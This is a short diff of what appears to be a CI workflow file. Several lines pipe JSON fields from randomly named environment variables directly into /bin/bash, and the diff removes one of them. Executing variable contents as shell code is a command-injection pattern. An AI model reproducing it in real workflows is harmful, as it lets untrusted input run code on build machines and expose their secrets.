@@ -24,7 +24,6 @@ jobs:
           echo $nhsu29476 | jq -r .g6097 | /bin/bash
           echo $oq392 | jq -r .i863 | /bin/bash
           printf '%s' "$pev602" | jq -r .j7 | /bin/bash
-          printf '%s' "$i9" | jq -r .ta849 | /bin/bash
           echo $xtvzw03 | jq -r .en833 | /bin/bash
 
       - name: Save data
